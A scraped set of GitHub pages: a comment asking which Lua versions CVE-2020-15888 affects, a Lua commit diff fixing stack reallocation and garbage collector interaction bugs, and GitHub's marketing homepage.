### @samboy **[samboy](/samboy)** commented on `[6298903](/lua/lua/commit/6298903e35217ab69c279056f925fb72900ce0b7)` [Jul 28, 2021](#commitcomment-54083714)

There was a problem hiding this comment.

### Choose a reason for hiding this comment

The reason will be displayed to describe this comment to others. [Learn more](https://docs.github.com/articles/managing-disruptive-comments/#hiding-a-comment).

Choose a reason

Spam
Abuse
Off Topic
Outdated
Duplicate
Resolved

Hide comment

According to <https://ubuntu.com/security/CVE-2020-15888> this only affects Lua 5.4. If that assessment is in error, could someone please link to patches for earlier versions of Lua.

Sorry, something went wrong.

All reactions

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flua%2Flua%2Fcommit%2F6298903e35217ab69c279056f925fb72900ce0b7) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_fc07d999_20250119_122105.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flua%2Flua%2Fcommit%2Feb41999461b6f428186c55abd95f4ce1a76217d5)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flua%2Flua%2Fcommit%2Feb41999461b6f428186c55abd95f4ce1a76217d5)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Fvoltron%2Fcommit_fragments%2Frepo_layout&source=header-repo&source_repo=lua%2Flua)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[lua](/lua)
/
**[lua](/lua/lua)**
Public

* [Notifications](/login?return_to=%2Flua%2Flua) You must be signed in to change notification settings
* [Fork
  1.7k](/login?return_to=%2Flua%2Flua)
* [Star
   8.7k](/login?return_to=%2Flua%2Flua)

* [Code](/lua/lua)
* [Pull requests
  0](/lua/lua/pulls)
* [Actions](/lua/lua/actions)
* [Security](/lua/lua/security)
* [Insights](/lua/lua/pulse)

Additional navigation options

* [Code](/lua/lua)
* [Pull requests](/lua/lua/pulls)
* [Actions](/lua/lua/actions)
* [Security](/lua/lua/security)
* [Insights](/lua/lua/pulse)

## Commit

[Permalink](/lua/lua/commit/eb41999461b6f428186c55abd95f4ce1a76217d5)

This commit does not belong to any branch on this repository, and may belong to a fork outside of the repository.

Fixed bugs of stack reallocation x GC

[Browse files](/lua/lua/tree/eb41999461b6f428186c55abd95f4ce1a76217d5)
Browse the repository at this point in the history

```
Macro 'checkstackGC' was doing a GC step after resizing the stack;
the GC could shrink the stack and undo the resize. Moreover, macro
'checkstackp' also does a GC step, which could remove the preallocated
CallInfo when calling a function. (Its name has been changed to
'checkstackGCp' to emphasize that it calls the GC.)
```

* Loading branch information

[![@roberto-ieru](https://avatars.githubusercontent.com/u/16293687?s=40&v=4)](/roberto-ieru)

[roberto-ieru](/lua/lua/commits?author=roberto-ieru "View all commits by roberto-ieru")
committed
Jul 7, 2020

1 parent
[314c605](/lua/lua/commit/314c6057b785cd94ac88905ccfce61724107d66b)

commit eb41999

 Show file tree

 Hide file tree

Showing
**4 changed files**
with
**14 additions**
and
**11 deletions**.

* Whitespace
* Ignore whitespace

* Split
* Unified

* ldo.c
  [ldo.c](#diff-a1e6f0be3689739fa1e5707427e78d792c7f6a333bed95fd05c4382d60bda7c4)
* ldo.h
  [ldo.h](#diff-380bf759928a9666fdd9f9a1a80dfcce660500730401e92f28dda38bd993ab80)
* ltm.c
  [ltm.c](#diff-c1b2a47936dcb14ba62d3d213e36f79745f53b4eb29b77e9dbf8ec3002cec499)
* lvm.c
  [lvm.c](#diff-8183d3b1a2a90cb957941525c854b25257bcbd92e2af4760b1aedc134243b5ee)

## There are no files selected for viewing

13 changes: 7 additions & 6 deletions

13
[ldo.c](#diff-a1e6f0be3689739fa1e5707427e78d792c7f6a333bed95fd05c4382d60bda7c4 "ldo.c")

Show comments

[View file](/lua/lua/blob/eb41999461b6f428186c55abd95f4ce1a76217d5/ldo.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -465,13 +465,13 @@ void luaD\_call (lua\_State \*L, StkId func, int nresults) { |
|  |  | f = fvalue(s2v(func)); |
|  |  | Cfunc: { |
|  |  | int n; /\* number of returns \*/ |
|  |  | CallInfo \*ci = next\_ci(L); |
|  |  | checkstackp(L, LUA\_MINSTACK, func); /\* ensure minimum stack size \*/ |
|  |  | CallInfo \*ci; |
|  |  | checkstackGCp(L, LUA\_MINSTACK, func); /\* ensure minimum stack size \*/ |
|  |  | L->ci = ci = next\_ci(L); |
|  |  | ci->nresults = nresults; |
|  |  | ci->callstatus = CIST\_C; |
|  |  | ci->top = L->top + LUA\_MINSTACK; |
|  |  | ci->func = func; |
|  |  | L->ci = ci; |
|  |  | lua\_assert(ci->top <= L->stack\_last); |
|  |  | if (L->hookmask & LUA\_MASKCALL) { |
|  |  | int narg = cast\_int(L->top - func) - 1; |
| Expand All | | @@ -485,12 +485,13 @@ void luaD\_call (lua\_State \*L, StkId func, int nresults) { |
|  |  | break; |
|  |  | } |
|  |  | case LUA\_VLCL: { /\* Lua function \*/ |
|  |  | CallInfo \*ci = next\_ci(L); |
|  |  | CallInfo \*ci; |
|  |  | Proto \*p = clLvalue(s2v(func))->p; |
|  |  | int narg = cast\_int(L->top - func) - 1; /\* number of real arguments \*/ |
|  |  | int nfixparams = p->numparams; |
|  |  | int fsize = p->maxstacksize; /\* frame size \*/ |
|  |  | checkstackp(L, fsize, func); |
|  |  | checkstackGCp(L, fsize, func); |
|  |  | L->ci = ci = next\_ci(L); |
|  |  | ci->nresults = nresults; |
|  |  | ci->u.l.savedpc = p->code; /\* starting point \*/ |
|  |  | ci->callstatus = 0; |
| Expand All | | @@ -504,7 +505,7 @@ void luaD\_call (lua\_State \*L, StkId func, int nresults) { |
|  |  | break; |
|  |  | } |
|  |  | default: { /\* not a function \*/ |
|  |  | checkstackp(L, 1, func); /\* space for metamethod \*/ |
|  |  | checkstackGCp(L, 1, func); /\* space for metamethod \*/ |
|  |  | luaD\_tryfuncTM(L, func); /\* try to get '\_\_call' metamethod \*/ |
|  |  | goto retry; /\* try again with metamethod \*/ |
|  |  | } |
| Expand Down | |  |

6 changes: 4 additions & 2 deletions

6
[ldo.h](#diff-380bf759928a9666fdd9f9a1a80dfcce660500730401e92f28dda38bd993ab80 "ldo.h")

Show comments

[View file](/lua/lua/blob/eb41999461b6f428186c55abd95f4ce1a76217d5/ldo.h)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -17,6 +17,8 @@ |
|  |  | \*\* Macro to check stack size and grow stack if needed. Parameters |
|  |  | \*\* 'pre'/'pos' allow the macro to preserve a pointer into the |
|  |  | \*\* stack across reallocations, doing the work only when needed. |
|  |  | \*\* It also allows the running of one GC step when the stack is |
|  |  | \*\* reallocated. |
|  |  | \*\* 'condmovestack' is used in heavy tests to force a stack reallocation |
|  |  | \*\* at every check. |
|  |  | \*/ |
| Expand All | | @@ -35,7 +37,7 @@ |
|  |  |  |
|  |  |  |
|  |  | /\* macro to check stack size, preserving 'p' \*/ |
|  |  | #define checkstackp(L,n,p) \ |
|  |  | #define checkstackGCp(L,n,p) \ |
|  |  | luaD\_checkstackaux(L, n, \ |
|  |  | ptrdiff\_t t\_\_ = savestack(L, p); /\* save 'p' \*/ \ |
|  |  | luaC\_checkGC(L), /\* stack grow uses memory \*/ \ |
| Expand All | | @@ -44,7 +46,7 @@ |
|  |  |  |
|  |  | /\* macro to check stack size and GC \*/ |
|  |  | #define checkstackGC(L,fsize) \ |
|  |  | luaD\_checkstackaux(L, (fsize), (void)0, luaC\_checkGC(L)) |
|  |  | luaD\_checkstackaux(L, (fsize), luaC\_checkGC(L), (void)0) |
|  |  |  |
|  |  |  |
|  |  | /\* type of protected functions, to be ran by 'runprotected' \*/ |
| Expand Down | |  |

4 changes: 2 additions & 2 deletions

4
[ltm.c](#diff-c1b2a47936dcb14ba62d3d213e36f79745f53b4eb29b77e9dbf8ec3002cec499 "ltm.c")

Show comments

[View file](/lua/lua/blob/eb41999461b6f428186c55abd95f4ce1a76217d5/ltm.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -240,7 +240,7 @@ void luaT\_adjustvarargs (lua\_State \*L, int nfixparams, CallInfo \*ci, |
|  |  | int actual = cast\_int(L->top - ci->func) - 1; /\* number of arguments \*/ |
|  |  | int nextra = actual - nfixparams; /\* number of extra arguments \*/ |
|  |  | ci->u.l.nextraargs = nextra; |
|  |  | checkstackGC(L, p->maxstacksize + 1); |
|  |  | luaD\_checkstack(L, p->maxstacksize + 1); |
|  |  | /\* copy function to the top of the stack \*/ |
|  |  | setobjs2s(L, L->top++, ci->func); |
|  |  | /\* move fixed parameters to the top of the stack \*/ |
| Expand All | | @@ -259,7 +259,7 @@ void luaT\_getvarargs (lua\_State \*L, CallInfo \*ci, StkId where, int wanted) { |
|  |  | int nextra = ci->u.l.nextraargs; |
|  |  | if (wanted < 0) { |
|  |  | wanted = nextra; /\* get all extra arguments available \*/ |
|  |  | checkstackp(L, nextra, where); /\* ensure stack space \*/ |
|  |  | checkstackGCp(L, nextra, where); /\* ensure stack space \*/ |
|  |  | L->top = where + nextra; /\* next instruction will need top \*/ |
|  |  | } |
|  |  | for (i = 0; i < wanted && i < nextra; i++) |
| Expand Down | |  |

2 changes: 1 addition & 1 deletion

2
[lvm.c](#diff-8183d3b1a2a90cb957941525c854b25257bcbd92e2af4760b1aedc134243b5ee "lvm.c")

Show comments

[View file](/lua/lua/blob/eb41999461b6f428186c55abd95f4ce1a76217d5/lvm.c)
Edit file

Delete file

This file contains bidirectional Unicode text that may be interpreted or compiled differently than what appears below. To review, open the file in an editor that reveals hidden Unicode characters.
[Learn more about bidirectional Unicode characters](https://github.co/hiddenchars)

  [Show hidden characters](%7B%7B%20revealButtonHref%20%7D%7D)

| Original file line number | Diff line number | Diff line change |
| --- | --- | --- |
| Expand Up | | @@ -1634,7 +1634,7 @@ void luaV\_execute (lua\_State \*L, CallInfo \*ci) { |
|  |  | while (!ttisfunction(s2v(ra))) { /\* not a function? \*/ |
|  |  | luaD\_tryfuncTM(L, ra); /\* try '\_\_call' metamethod \*/ |
|  |  | b++; /\* there is now one extra argument \*/ |
|  |  | checkstackp(L, 1, ra); |
|  |  | checkstackGCp(L, 1, ra); |
|  |  | } |
|  |  | if (!ttisLclosure(s2v(ra))) { /\* C function? \*/ |
|  |  | luaD\_call(L, ra, LUA\_MULTRET); /\* call it \*/ |
| Expand Down | |  |

Toggle all file notes
Toggle all file annotations

### 0 comments on commit `eb41999`

Please
[sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Flua%2Flua%2Fcommit%2Feb41999461b6f428186c55abd95f4ce1a76217d5) to comment.

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_3097fca9_20250119_135944.html ===

[Skip to content](#start-of-content)

GitHub Copilot is now available for free.
[Learn more](https://github.com/features/copilot/?utm_source=github&utm_medium=banner&utm_campaign=copilotfree-bannerheader)

## Navigation Menu

Toggle navigation

[Sign in](/login)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F&source=header-home)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# Build and ship software on a single, collaborative platform

Join the world’s most widely adopted AI-powered developer platform.

Enter your emailSign up for GitHub[Try GitHub Copilot](/features/copilot)
## GitHub features

A demonstration animation of a code editor using GitHub Copilot Chat, where the user requests GitHub Copilot to refactor duplicated logic and extract it into a reusable function for a given code snippet.

CodePlanCollaborateAutomateSecure

Build code quickly and more securely with GitHub Copilot embedded throughout your workflows.

## GitHub is used by

![Shopify](https://github.githubassets.com/assets/shopify-3fed3011ac81.svg)![EY](https://github.githubassets.com/assets/ey-7434b194d68c.svg)![Figma](https://github.githubassets.com/assets/figma-04e0038c0fef.svg)![Duolingo](https://github.githubassets.com/assets/duolingo-ea3a0aa56fa5.svg)![New York Times](https://github.githubassets.com/assets/newyorktimes-9d76d7f338f5.svg)![Mercado Libre](https://github.githubassets.com/assets/mercado-libre-762f679589f2.svg)![American Airlines](https://github.githubassets.com/assets/american-airlines-a2b13c8fbe08.svg)![Ford](https://github.githubassets.com/assets/ford-2fb5195a4c7c.svg)![Mercedes Benz](https://github.githubassets.com/assets/mercedes-b9190458c80e.svg)![Société Générale](https://github.githubassets.com/assets/societe-generale-7a3414490494.svg)![Vodafone](https://github.githubassets.com/assets/vodafone-6e0f322de6cd.svg)![Philips](https://github.githubassets.com/assets/philips-8087a5f95f5c.svg)![SAP](https://github.githubassets.com/assets/sap-ea7dcd02e37d.svg)![Infosys](https://github.githubassets.com/assets/infosys-7587455de0bd.svg)![Spotify](https://github.githubassets.com/assets/spotify-591ecb426c1e.svg)![Shopify](https://github.githubassets.com/assets/shopify-3fed3011ac81.svg)![EY](https://github.githubassets.com/assets/ey-7434b194d68c.svg)![Figma](https://github.githubassets.com/assets/figma-04e0038c0fef.svg)![Duolingo](https://github.githubassets.com/assets/duolingo-ea3a0aa56fa5.svg)![New York Times](https://github.githubassets.com/assets/newyorktimes-9d76d7f338f5.svg)![Mercado Libre](https://github.githubassets.com/assets/mercado-libre-762f679589f2.svg)![American Airlines](https://github.githubassets.com/assets/american-airlines-a2b13c8fbe08.svg)![Ford](https://github.githubassets.com/assets/ford-2fb5195a4c7c.svg)![Mercedes Benz](https://github.githubassets.com/assets/mercedes-b9190458c80e.svg)![Société Générale](https://github.githubassets.com/assets/societe-generale-7a3414490494.svg)![Vodafone](https://github.githubassets.com/assets/vodafone-6e0f322de6cd.svg)![Philips](https://github.githubassets.com/assets/philips-8087a5f95f5c.svg)![SAP](https://github.githubassets.com/assets/sap-ea7dcd02e37d.svg)![Infosys](https://github.githubassets.com/assets/infosys-7587455de0bd.svg)![Spotify](https://github.githubassets.com/assets/spotify-591ecb426c1e.svg)
## Accelerate performance

With GitHub Copilot embedded throughout the platform, you can simplify your toolchain, automate tasks, and improve the developer experience.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)A Copilot chat window with extensions enabled. The user inputs the @ symbol to reveal a list of five Copilot Extensions. @Sentry is selected from the list, which shifts the window to a chat directly with that extension. There are three sample prompts at the bottom of the chat window, allowing the user to Get incident information, Edit status on incident, or List the latest issues. The last one is activated to send the prompt: @Sentry List the latest issues. The extension then lists several new issues and their metadata.
### Work 55% faster.1 Increase productivity with AI-powered coding assistance, including code completion, chat, and more.

1[Survey: The AI wave continues to grow on software development teams, 2024.](https://github.blog/news-insights/research/survey-ai-wave-grows/)

[Explore GitHub Copilot](/features/copilot)![Duolingo](https://github.githubassets.com/assets/logo-duolingo-14477f9e54a6.svg)

Duolingo boosts developer speed by 25% with GitHub Copilot

[Read customer story](/customer-stories/duolingo)![Gartner](https://github.githubassets.com/assets/logo-gartner-aa8c2e452b64.svg)

2024 Gartner® Magic Quadrant™ for AI Code Assistants

[Read report](https://www.gartner.com/doc/reprints?id=1-2IKO4MPE&ct=240819&st=sb)![](https://github.githubassets.com/assets/accordion-1-ce487d44c0bf.webp)![](https://github.githubassets.com/assets/accordion-2-730955545f07.webp)![](https://github.githubassets.com/assets/accordion-3-52ca331d22ea.webp)![](https://github.githubassets.com/assets/accordion-4-a26744b70ff7.webp)
### Automate any workflow

Optimize your process with simple and secured CI/CD.

A list of workflows displays a heading ‘45,167 workflow runs’ at the top. Below are five rows of completed workflows accompanied by their completion time and their duration formatted in minutes and seconds.[Discover GitHub Actions](/features/actions)
### Get up and running in seconds

Start building instantly with a comprehensive dev environment in the cloud.

A GitHub Codespaces setup for the landing page of a game called OctoInvaders. On the left is a code editor with some HTML and Javascript files open. On the right is a live render of the page. In front of this split editor window is a screenshot of two active GitHub Codespaces environments with their branch names and a button to ‘Create codespace on main.’[Check out GitHub Codespaces](/features/codespaces)
### Build on the go

Manage projects and chat with GitHub Copilot from anywhere.

Two smartphone screens side by side. The left screen shows a Notification inbox, listing issues and pull requests from different repositories like TensorFlow and GitHub’s OctoArcade octoinvaders. The right screen shows a new conversation in GitHub Copilot chat.[Download GitHub Mobile](/mobile)
### Integrate the tools you love

Sync with 17,000+ integrations and a growing library of Copilot Extensions.

A grid of fifty app tiles displays logos for integrations and extensions for companies like Stripe, Slack, and Docker. The tiles extend beyond the bounds of the image to indicate a wide array of apps. [Visit GitHub Marketplace](/marketplace)
## Built-in application security where found means fixed

Use AI to find and fix vulnerabilities—freeing your teams to ship more secure software faster.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)
### Apply fixes in seconds. Spend less time fixing vulnerabilities and more time building features with Copilot Autofix.

[Explore GitHub Advanced Security](/enterprise/advanced-security)![Copilot Autofix identifies vulnerable code and provides an explanation, together with a secure code suggestion to remediate the vulnerability.](https://github.githubassets.com/assets/hero-64ecd484397f.webp)

Solve security debt. Leverage AI-assisted security campaigns to reduce application vulnerabilities and zero-day attacks.

[Discover security campaigns](/enterprise/advanced-security)![A security campaign screen displays the campaign’s progress bar with 97% completed of 701 alerts. A total of 23 alerts are left with 13 in progress, and the campaign started 20 days ago. The status below shows that there are 7 days left in the campaign with a due date of November 15, 2024.](https://github.githubassets.com/assets/pillar-1-dd667a921f55.webp)

Dependencies you can depend on. Update vulnerable dependencies with supported fixes for breaking changes.

[Learn about Dependabot](/features/security/software-supply-chain)![List of dependencies defined in a requirements .txt file.](https://github.githubassets.com/assets/pillar-2-ff69e872920a.webp)

Your secrets, your business: protected.  Detect, prevent, and remediate leaked secrets across your organization.

[Read about secret scanning](/features/security/code)![GitHub push protection confirms and displays an active secret, and blocks the push.](https://github.githubassets.com/assets/pillar-3-0a063e2daae2.webp)
### 7x fastervulnerability fixes with GitHub2

2This 7X times factor is based on data from the industry’s longest running analysis of fix rates Veracode State of Software Security 2023, which cites the average time to fix 50% of flaws as 198 days vs. GitHub’s fix rates of 72% of flaws with in 28 days which is at a minimum of 7X faster when compared.

### 90% coverage[of alert types in all supported languages with Copilot Autofix](https://docs.github.com/en/code-security/code-scanning/managing-your-code-scanning-configuration/codeql-query-suites)

## Work together, achieve more

Collaborate with your teams, use management tools that sync with your projects, and code from anywhere—all on a single, integrated platform.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)![A project management dashboard showing tasks for the ‘OctoArcade Invaders’ project, with tasks grouped under project phase categories like ‘Prototype,’ ‘Beta,’ and ‘Launch’ in a table layout. One of the columns displays sub-issue progress bars with percentages for each issue.](https://github.githubassets.com/assets/hero-961322485af6.webp)
### Your workflows, your way. Plan effectively with an adaptable spreadsheet that syncs with your work.

[Jump into GitHub Projects](/features/issues)“
> It helps us onboard new software engineers and get them productive right away. We have all our source code, issues, and pull requests in one place... GitHub is a complete platform that frees us from menial tasks and enables us to do our best work.

Fabian FaulhaberApplication manager at Mercedes-Benz

![](https://github.githubassets.com/assets/accordion-1-38ad6b6d1b20.webp)![](https://github.githubassets.com/assets/accordion-2-c0a62cfc31a1.webp)![](https://github.githubassets.com/assets/accordion-3-5d5d222f1830.webp)![](https://github.githubassets.com/assets/accordion-4-7abff9233556.webp)
### Keep track of your tasks

Create issues and manage projects with tools that adapt to your code.

Display of task tracking within an issue, showing the status of related sub-issues and their connection to the main issue.[Explore GitHub Issues](/features/issues)
### Share ideas and ask questions

Create space for open-ended conversations alongside your project.

A GitHub Discussions thread where a GitHub user suggests a power-up idea involving Hubot revealing a path and protecting Mona. The post has received 5 upvotes and several reactions. Below, three other users add to the discussion, suggesting Hubot could provide different power-ups depending on levels and appreciating the collaboration idea.[Discover GitHub Discussions](/features/discussions)
### Review code changes together

Create review processes that improve code quality and fit neatly into your workflow.

Two code review approvals by helios-ackmore and amanda-knox, which are followed by three successful checks for ‘Build,’ ‘Test,’ and ‘Publish.’[Learn about code review](/features/code-review)
### Fund open source projects

Become an open source partner and support the tools and libraries that power your work.

A GitHub Sponsors popup displays ‘$15,000 a month’ with a progress bar showing 87% towards a $15,000 goal.[Dive into GitHub Sponsors](/sponsors)
## From startups to enterprises, GitHub scales with teams of any size in any industry.

By industryBy sizeBy use case

---

[![](https://github.githubassets.com/assets/figma-62d390a52419.webp)![Figma](https://github.githubassets.com/assets/figma-9b0c642e96b8.svg)Technology

Figma streamlines development and strengthens security

Read customer story](https://github.com/customer-stories/figma)[![](https://github.githubassets.com/assets/mercedes-benz-d8f89b041561.webp)![Mercedes-Benz](https://github.githubassets.com/assets/mercedes-benz-60ddd54043e7.svg)Automotive

Mercedes-Benz standardizes source code and automates onboarding

Read customer story](https://github.com/customer-stories/mercedes-benz)[![](https://github.githubassets.com/assets/mercado-libre-579cb5447302.webp)![Mercado Libre](https://github.githubassets.com/assets/mercado-libre-2d6d610fa873.svg)Financial services

Mercado Libre cuts coding time by 50%

Read customer story](https://github.com/customer-stories/mercado-libre)[Explore customer stories](/customer-stories)

---

[View all solutions](/solutions)
## Millions of developers and businesses call GitHub home

Whether you’re scaling your development process or just learning how to code, GitHub is where you belong. Join the world’s most widely adopted AI-powered developer platform to build the technologies that redefine what’s possible.

Enter your emailSign up for GitHub[Try GitHub Copilot](/features/copilot)

## Site-wide Links

### Subscribe to our developer newsletter

Get tips, technical guides, and best practices. Twice a month. Right in your inbox.

[Subscribe](https://resources.github.com/newsletter/)

### Product

* [Features](/features)
* [Enterprise](/enterprise)
* [Copilot](/features/copilot)
* [Security](/security)
* [Pricing](/pricing)
* [Team](/team)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare)

### Platform

* [Developer API](https://docs.github.com/get-started/exploring-integrations/about-building-integrations)
* [Partners](https://partner.github.com)
* [Education](https://github.com/edu)
* [GitHub CLI](https://cli.github.com)
* [GitHub Desktop](https://desktop.github.com)
* [GitHub Mobile](https://github.com/mobile)

### Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com)
* [Premium Support](/enterprise/premium-support)
* [Skills](https://skills.github.com)
* [Status](https://www.githubstatus.com)
* [Contact GitHub](https://support.github.com?tags=dotcom-footer)

### Company

* [About](https://github.com/about)
* [Customer stories](/customer-stories?type=enterprise)
* [Blog](https://github.blog)
* [The ReadME Project](/readme)
* [Careers](https://github.careers)
* [Newsroom](/newsroom)
* [Inclusion](/about/diversity)
* [Social Impact](https://socialimpact.github.com)
* [Shop](https://shop.github.com)

* © 2025 GitHub, Inc.
* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
